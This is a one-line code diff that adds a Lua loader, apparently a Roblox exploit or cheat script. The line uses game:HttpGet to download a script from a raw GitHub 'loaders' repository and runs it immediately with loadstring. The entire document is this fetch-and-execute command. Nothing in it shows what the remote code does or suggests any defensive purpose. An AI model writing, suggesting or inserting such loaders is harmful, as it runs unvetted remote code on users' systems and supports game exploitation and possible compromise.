@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/upd-forsaken-spam4-sjcflj07ihrjwz.lua"))()
